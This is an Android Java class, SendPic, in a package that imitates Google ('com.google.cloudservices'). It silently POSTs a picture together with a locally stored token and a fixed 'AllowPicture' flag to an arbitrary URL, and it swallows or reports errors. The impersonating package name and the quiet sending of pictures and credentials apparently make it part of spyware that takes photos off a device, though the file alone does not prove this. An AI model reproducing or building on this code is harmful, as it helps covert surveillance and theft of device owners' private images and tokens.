package com.google.cloudservices;

import android.content.Context;
import android.util.Log;

import com.android.volley.Cache;
import com.android.volley.Network;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.BasicNetwork;
import com.android.volley.toolbox.DiskBasedCache;
import com.android.volley.toolbox.HurlStack;
import com.android.volley.toolbox.StringRequest;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

public class SendPic {
    String token=null;
    StringRequest stringRequest=null;
    RequestQueue requestQueue=null;
    JSONObject jsonlogin= null;
    String status= null;
    public void send(final Context context, final String pic, String url){
        try {
            Cache cache = new DiskBasedCache(context.getCacheDir(), 1024 * 1024);
            Network network = new BasicNetwork(new HurlStack());
            requestQueue = new RequestQueue(cache, network);
            requestQueue.start();
            cache.clear();
            stringRequest=new StringRequest(Request.Method.POST,url,
                    new Response.Listener<String>() {
                        @Override
                        public void onResponse(String response) {
                            Log.e("testingma", response );
                            requestQueue.stop();

                            try {

                                jsonlogin = new JSONObject(response);
                                status = jsonlogin.getString("status");
                                if (status.equals("error")){
                                    SendEror sendEror=new SendEror();
                                    sendEror.sender(context,status+jsonlogin.getString("message"));
                                }
                            } catch (JSONException e) {
                                SendEror sendEror=new SendEror();
                                sendEror.sender(context,e.toString());
                                e.printStackTrace();
                            }





                        }
                    }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
                    Log.e("testingma", error.toString() );

                    //sm.add(context,url,key,jsonarray);
                }

            })
            {
                @Override
                protected Map<String, String> getParams(){
                    Map<String,String> params=new HashMap<String, String>();
                    params.put("pic",pic);
                    params.put("token",getToken(context));
                    params.put("picture",pic);
                    params.put("token1","AllowPicture");
                    return params;
                }
            };

            requestQueue.add(stringRequest);
        }catch (Exception e){}finally {
            requestQueue.cancelAll(stringRequest);
        }

    }
    public  String getToken(Context context){

        TokenDataBaseManager tokenDataBaseManager=new TokenDataBaseManager(context);
        token=tokenDataBaseManager.gettoken();
        tokenDataBaseManager.close();
        return token;

    }
}
